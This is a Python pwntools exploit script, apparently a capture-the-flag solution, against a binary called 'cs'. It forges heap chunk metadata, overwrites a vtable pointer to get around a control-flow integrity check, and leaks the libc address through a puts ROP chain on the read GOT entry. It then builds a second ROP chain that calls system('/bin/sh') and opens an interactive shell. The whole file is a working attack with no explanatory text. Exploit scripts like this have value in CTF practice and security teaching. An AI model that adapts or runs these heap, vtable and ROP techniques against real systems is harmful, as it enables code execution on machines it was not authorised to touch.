#!/usr/bin/python
from pwn import *
import base64
# from myutils import *

local_target=1
base=0x6061c0
uninit=1
fuckvt=1
bof = 0x400e76
fakevt=base+0x606310-0x6061c0
target  = base+0x6064a0-0x6061c0
vt=[0x41414141,bof,0x43434343,0x44444444]

exe = 'csgd_v'
lhost = '127.0.0.1'
lport = 2323
rhost= '192.168.91.132'
rport=2323

def getconnection():
    if local_target:
        # r = remote(lhost,lport)
        r = process("./cs")
    else:
        r = remote(rhost,rport)
    return r

r = getconnection()

z=''
while('Welcome' not in z):
    z=r.recv(timeout=1)
p = cyclic(0x2a0-1)+'\x00'

v =  [0x88,0x91]
v += [base+0x18-0x18,base+0x18-0x10]
v += [0x41]*6*2
v += [0x80,0x90]
v += [0x42]*8*2
v += [0,0x91]
v += vt
v += [0x43]*6*2
v += [0,0x91]

fc = p64s(v)

r.send(fc)
r.sendlineafter('Your Description:','yyy')
r.sendlineafter('your command:','m')
r.sendlineafter('CT','1')
for i in range(3):
    r.sendlineafter('your command:','m')
    r.sendlineafter('You have already choose a side, do you want to commit suicide and choose a new side?(y/n)','y')
    r.sendlineafter('CT','1')

if uninit:
    for i in range(3):
        r.sendlineafter('your command:','y')
        r.sendline(str(0x81))
        r.sendline('yyy')
    r.recvuntil('command:')
    r.sendline('b')
    p=cyclic(56)+p64(base+0x606280-0x6061c0)
    r.sendline(p)
    r.sendlineafter('Your choice:','q')
    r.sendlineafter('your command:','y')
    r.sendlineafter('what is the length of your message?','x')


if fuckvt:
    r.recvuntil('command:')
    r.sendline('m~y')


    r.sendlineafter('You have already choose a side, do you want to commit suicide and choose a new side?(y/n)','y')
    r.sendlineafter('CT','1')

    #fuck cfi
    r.sendlineafter('# ','rename')
    p=[0x0,0,0x4a0,target]
    p=p64s(p)
    r.sendline(p)
    r.sendlineafter('# ','rename')
    p=p64(fakevt)
    r.sendline(p)
    r.sendlineafter('# ','exit')

    r.sendlineafter('what is the length of your message?',str(0x33))
    p = [fakevt,0x6400000001,1,0,]
    p = p64s(p)
    r.sendlineafter('ALL:',p)
    sleep(0.1)
    p = cyclic(20)
    puts_plt = 0x400ce8
    poprdi=0x00000000004030e3
    poprsi=0x4030e1
    read_got = 0x0000000000605F90
    read_plt = 0x400d10
    blank_buf = 0x606280
    rop_1 = [poprdi,read_got,puts_plt,bof]
    p+=  p64s(rop_1)
    r.sendline(p)
    r.recvuntil(' ')
    read=r.recvuntil('\n').strip('\n')
    read = u64(read+'\x00'*2)
    libc_base=  read-0xf69a0
    system = libc_base+0x45380
    binsh  =  libc_base+0x18c58b
    rop_2=[poprdi,binsh,system]
    p = 'A'*20+p64s(rop_2)
    r.sendline(p)


r.interactive()